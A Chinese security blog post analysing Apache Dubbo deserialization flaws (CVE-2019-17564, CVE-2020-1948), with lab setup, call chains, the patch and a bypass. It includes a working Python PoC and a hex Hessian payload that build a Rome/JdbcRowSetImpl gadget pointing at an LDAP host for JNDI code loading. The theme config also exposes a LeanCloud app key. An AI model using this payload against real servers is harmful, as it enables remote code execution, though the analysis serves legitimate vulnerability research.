<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">dubbo反序列化漏洞分析 | popko&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "あやねさまのpopko";
  mashiro_option.author_name = "popko";
  mashiro_option.site_url = "https://pipimi110.github.io";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png,https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_02.png,https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_03.png".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://pipimi110.github.io">
          <img src="/img/custom/avatar.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>Live your life with passion! With some drive!</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="https://github.com/pipimi110" target="_blank" class="social-github" title="github">
                    <img src="/img/social/github.png">
                  </a>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">あやねさまの</span>
            <span class="shironeko">popko</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          转载
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      dubbo反序列化漏洞分析</h1>
      <p class="entry-census">
        <span>
          <a href="popko.top">
            <img src="https://www.popko.top/img/custom/avatar.jpg">
          </a>
        </span>
        <span>
          <a href="popko.top">popko</a>
        </span>
        <span class="bull">
        ·</span>
        2022-3-21<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <blockquote>
<p>除了官方推荐的默认Dubbo协议外，Dubbo还支持HTTP，RMI等协议。</p>
</blockquote>
<p>provider相当于服务器，是我们的攻击目标</p>
<p>consumer相当于客户机，不是攻击目标</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>zookeeper</li>
</ul>
<p>实际上 dubbo-spring-boot-samples 没有用到，不安装也可以</p>
<pre><code class="javascript">https://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz
</code></pre>
<p>解压后的根目录下新建data和logs两个文件夹，修改conf目录下的zoo_sample.cfg为zoo.cfg，覆盖原有的dataDir并添加dataLogDir</p>
<ul>
<li>dubbo-spring-boot-samples</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/dubbo-spring-boot-project/zip/refs/tags/2.7.5">https://codeload.github.com/apache/dubbo-spring-boot-project/zip/refs/tags/2.7.5</a></p>
<p>application.yml 改端口</p>
<pre><code>server:
  port: 8888
</code></pre><ul>
<li>dubbopoc/buddo-demo</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-basic">https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-basic</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a></p>
<blockquote>
<p>注意 此环境非spring-boot 没有tomcat依赖</p>
</blockquote>
<p>dubbo-provider.xml</p>
<pre><code>    &lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt;
</code></pre><p>需要安装zookeeper</p>
<p>bin\zkServer.cmd</p>
<pre><code>nc 127.0.0.1 20880

dubbo&gt;ls
PROVIDER:
top.lz2y.service.DemoService

dubbo&gt;ls top.lz2y.service.DemoService
top.lz2y.service.DemoService (as provider):
        sayHello
</code></pre><h2 id="CVE-2019-17564-http"><a href="#CVE-2019-17564-http" class="headerlink" title="CVE-2019-17564//http"></a>CVE-2019-17564//http</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231416#h3-3">https://www.anquanke.com/post/id/231416#h3-3</a></p>
<blockquote>
<ul>
<li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li>
<li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li>
<li>Apache Dubbo = 2.5.x</li>
</ul>
</blockquote>
<p>在用户使用HTTP协议进行通信时，会将消费者远程的request中POST的数据进行反序列化，而且Dubbo对于消息体未做过滤等处理，所以造成了这次反序列化问题。</p>
<pre><code>curl 
</code></pre><h2 id="CVE-2020-1948-Hessian"><a href="#CVE-2020-1948-Hessian" class="headerlink" title="CVE-2020-1948//Hessian"></a>CVE-2020-1948//Hessian</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/287658.html">https://www.freebuf.com/vuls/287658.html</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1338">http://rui0.cn/archives/1338</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7969#toc-2">https://xz.aliyun.com/t/7969#toc-2</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/dubbo-exp/blob/master/src/main/java/com/threedr3am/exp/dubbo/payload/hessian/RomePoc.java">https://github.com/threedr3am/dubbo-exp/blob/master/src/main/java/com/threedr3am/exp/dubbo/payload/hessian/RomePoc.java</a></p>
<p><a target="_blank" rel="noopener" href="https://he1m4n6a.github.io/2020/08/10/Apache-Dubbo-Provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89%E5%88%86%E6%9E%90/">https://he1m4n6a.github.io/2020/08/10/Apache-Dubbo-Provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89%E5%88%86%E6%9E%90/</a></p>
<p>Dubbo Provider默认反序列化 //注:触发任意类toString方法</p>
<blockquote>
<p>Apache Dubbo 2.7.0 to 2.7.6</p>
<p>Apache Dubbo 2.6.0 to 2.6.7</p>
<p>Apache Dubbo all 2.5.x versions (官方已不再提供支持)</p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200701195533-c4bdc8da-bb91-1.jpg" alt=""></p>
<p>在provider-sample文件夹下的 pom 里添加 rome 依赖//和yso rome不是同一种</p>
<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;com.rometools&lt;/groupId&gt;
    &lt;artifactId&gt;rome&lt;/artifactId&gt;
    &lt;version&gt;1.7.0&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre><p>攻击依赖于 rome 工具包中的 ToStringBean 工具</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre><code class="python"># import socket
# import time
# import re
# import binascii


# def sendEvilObjData(sock):
#     payload = b&quot;dabbc2000000000000000000000003b705322e302e3230366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f5365727669636505312e302e300a636f6d6d6f6e54657374124c6a6176612f6c616e672f4f626a6563743b48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92036f626a096265616e436c61737360433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92036f626a096265616e436c61737361431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac06706172616d73096c697374656e657273036d61700a6368617253747265616d0b617363696953747265616d0d756e69636f646553747265616d0c62696e61727953747265616d0f7374724d61746368436f6c756d6e730d694d61746368436f6c756d6e73057265734d4406726f77734d4402727302707304636f6e6e09666574636853697a650866657463684469720969736f6c6174696f6e1065736361706550726f63657373696e6708726561644f6e6c790b636f6e63757272656e63790c6d61784669656c6453697a65076d6178526f77730c717565727954696d656f75740b73686f7744656c657465640a726f77536574547970650a64617461536f757263650355524c07636f6d6d616e64624d136a6176612e7574696c2e486173687461626c655a4e4e4e4e4e4e56106a6176612e7574696c2e566563746f729a03666f6f4e4e4e4e4e4e4e4e4e56919a8f8f8f8f8f8f8f8f8f8f4e4e4e4e4e90cbe8925454cbf090909046cbec1d6c6461703a2f2f3132372e302e302e313a383038372f4578706c6f69744e4e430f6a6176612e6c616e672e436c61737391046e616d65631d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c633029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e5191519151915a48047061746830366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963651272656d6f74652e6170706c69636174696f6e3024647562626f2d6175746f2d636f6e6669677572652d636f6e73756d65722d73616d706c6509696e7465726661636530366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963650776657273696f6e05312e302e305a&quot;
#     sock.send(binascii.a2b_hex(payload))


# def run(dip, dport):
#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server_addr = (dip, dport)
#     sock.connect(server_addr)
#     sendEvilObjData(sock)


# run(&quot;127.0.0.1&quot;, 12345)
# print(&quot;123&quot;)

# pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder, new_object
from dubbo.client import DubboClient

client = DubboClient(&#39;127.0.0.1&#39;, 12345)

JdbcRowSetImpl = new_object(
    &#39;com.sun.rowset.JdbcRowSetImpl&#39;,
    dataSource=&quot;ldap://xxx.xxx.xxx.xxx:1389/o=tomcat&quot;,
    strMatchColumns=[&quot;foo&quot;]
)
JdbcRowSetImplClass = new_object(
    &#39;java.lang.Class&#39;,
    name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
)
toStringBean = new_object(
    &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,
    beanClass=JdbcRowSetImplClass,
    obj=JdbcRowSetImpl
)

resp = client.send_request_and_return_response(
    service_name=&#39;cn.rui0&#39;,
    method_name=&#39;$invoke&#39;,
    args=[toStringBean])
print(resp)

</code></pre>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p><a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a></p>
<p>bypass有问题，需要手动改改</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>rome依赖 toString-&gt;jndi注入</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
<h4 id="python-dubbo2-7-3"><a href="#python-dubbo2-7-3" class="headerlink" title="python //dubbo2.7.3"></a>python //dubbo2.7.3</h4><p>python版本poc成功触发的关键点在于，通过构造一个不存在的<code>service_name</code>使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞</p>
<h5 id="sink1"><a href="#sink1" class="headerlink" title="sink1"></a>sink1</h5><p>DubboProtocol</p>
<pre><code class="java">    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123;
        ...
        DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey);
        if (exporter == null) &#123;
            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv);
        &#125;//触发inv.toString()
</code></pre>
<p>调用链</p>
<pre><code>getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
decodeInvocationArgument:282, CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:137, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)
decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)
callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)
channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)
invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)
channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)
invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)
read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)
processSelectedKey:682, NioEventLoop (io.netty.channel.nio)
processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)
processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)
run:496, NioEventLoop (io.netty.channel.nio)
run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)
run:74, ThreadExecutorMap$2 (io.netty.util.internal)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:748, Thread (java.lang)
</code></pre><pre><code class="java">                        inv = new DecodeableRpcInvocation(channel, req, is, proto);
                        inv.decode();
</code></pre>
<p>到字符串拼接</p>
<pre><code class="java"> &quot;, message:&quot; + inv //inv 为 DecodeableRpcInvocation
</code></pre>
<p>触发StringBuilder.append</p>
<pre><code>    @Override
    public StringBuilder append(Object obj) &#123;
        return append(String.valueOf(obj));
    &#125;
</code></pre><pre><code>    public static String valueOf(Object obj) &#123;
        return (obj == null) ? &quot;null&quot; : obj.toString();
    &#125;
</code></pre><p>RpcInvocation</p>
<pre><code class="java">    public String toString() &#123;
        return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;;
    &#125;//Arrays.toString(this.arguments)
</code></pre>
<p>Arrays.toString</p>
<pre><code class="java">    public static String toString(Object[] a) &#123;
        ...
        for (int i = 0; ; i++) &#123;
            b.append(String.valueOf(a[i]));
</code></pre>
<h5 id="sink2-bypass4-除了第一个sink其他都可以打2-7-13"><a href="#sink2-bypass4-除了第一个sink其他都可以打2-7-13" class="headerlink" title="sink2//bypass4//除了第一个sink其他都可以打2.7.13"></a>sink2//bypass4//除了第一个sink其他都可以打2.7.13</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
<blockquote>
<p>在readUTF的位置writeObject(HashMap)</p>
</blockquote>
<pre><code class="java">    protected IOException expect(String expect, int ch) throws IOException &#123;
        if (ch &lt; 0) &#123;
            return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;);
        &#125; else &#123;
            --this._offset;

            try &#123;
                Object obj = this.readObject();
                return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;);

</code></pre>
<pre><code>expect:3517, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readString:1853, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readUTF:80, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:112, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
</code></pre><p>DecodeableRpcInvocation</p>
<pre><code class="java">    public Object decode(Channel channel, InputStream input) throws IOException &#123;
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
        String path = in.readUTF();
        this.setAttachment(&quot;path&quot;, path);
        this.setAttachment(&quot;version&quot;, in.readUTF());
        this.setMethodName(in.readUTF());
        String desc = in.readUTF();//
</code></pre>
<pre><code>    public String readUTF() throws IOException &#123;
        return this.mH2i.readString();
    &#125;
</code></pre><pre><code class="java">    public String readString() throws IOException &#123;
        int tag = this.read();
        int ch;
        switch(tag) &#123;
        case 0:
        ...
        case 31:
            this._isLastChunk = true;
            this._chunkLength = tag - 0;
            this._sbuf.setLength(0);

            while((ch = this.parseChar()) &gt;= 0) &#123;
                this._sbuf.append((char)ch);
            &#125;

            return this._sbuf.toString();
        case 32:
        ...
        case 127:
        default:
            throw this.expect(&quot;string&quot;, tag);//tag=72 进入sink
</code></pre>
<h4 id="dubbo反序列化实现原理-能不能直接触发readObject反序列化呢-不能"><a href="#dubbo反序列化实现原理-能不能直接触发readObject反序列化呢-不能" class="headerlink" title="dubbo反序列化实现原理//能不能直接触发readObject反序列化呢//不能"></a>dubbo反序列化实现原理//能不能直接触发readObject反序列化呢//不能</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903632207364104">https://juejin.cn/post/6844903632207364104</a></p>
<blockquote>
<p>decode:112, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)<br>decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)<br>callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)<br>channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)<br>invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)<br>channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)<br>invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)<br>read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)<br>processSelectedKey:682, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)<br>run:496, NioEventLoop (io.netty.channel.nio)<br>run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)<br>run:74, ThreadExecutorMap$2 (io.netty.util.internal)<br>run:30, FastThreadLocalRunnable (io.netty.util.concurrent)<br>run:748, Thread (java.lang)</p>
</blockquote>
<pre><code class="java">    public Object decode(Channel channel, InputStream input) throws IOException &#123;
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
        this.setAttachment(&quot;path&quot;, in.readUTF());
        this.setAttachment(&quot;version&quot;, in.readUTF());
        this.setMethodName(in.readUTF());

        try &#123;
            String desc = in.readUTF();
            Object[] args;
            Class[] pts;
            if (desc.length() == 0) &#123;
                pts = DubboCodec.EMPTY_CLASS_ARRAY;
                args = DubboCodec.EMPTY_OBJECT_ARRAY;
            &#125; else &#123;
                pts = ReflectUtils.desc2classArray(desc);//Class.forName 实现
                args = new Object[pts.length];

                for(int i = 0; i &lt; args.length; ++i) &#123;
                    try &#123;
                        args[i] = in.readObject(pts[i]);
</code></pre>
<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</p>
<pre><code>    public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException &#123;
        return this.mH2i.readObject(cls);
    &#125;
</code></pre><p><strong>使用dubbo的Hessian2ObjectInput.readObject 不会触发java原生的 readObject</strong></p>
<h4 id="Hessian-反序列化-dubbo2-7-5"><a href="#Hessian-反序列化-dubbo2-7-5" class="headerlink" title="Hessian 反序列化//dubbo2.7.5"></a>Hessian 反序列化//dubbo2.7.5</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346">https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346</a></p>
<h5 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h5><p>DubboProtocol.getInvocationWithoutData</p>
<pre><code class="java">if (exporter == null) &#123;
            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv));
</code></pre>
<pre><code class="java">    private Invocation getInvocationWithoutData(Invocation invocation) &#123;
        if (this.logger.isDebugEnabled()) &#123;//开启debug 仍可触发
            return invocation;
        &#125; else if (invocation instanceof RpcInvocation) &#123;
            RpcInvocation rpcInvocation = (RpcInvocation)invocation;
            rpcInvocation.setArguments((Object[])null);//清空防止 RpcInvocation.toString 触发 Arrays.toString(this.arguments)
            return rpcInvocation;
        &#125; else &#123;
            return invocation;
        &#125;
    &#125;
</code></pre>
<h5 id="区别点"><a href="#区别点" class="headerlink" title="区别点"></a>区别点</h5><p>DubboCodec.decodeBody</p>
<pre><code class="java">    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123;
        byte flag = header[2];
        byte proto = (byte)(flag &amp; 31);
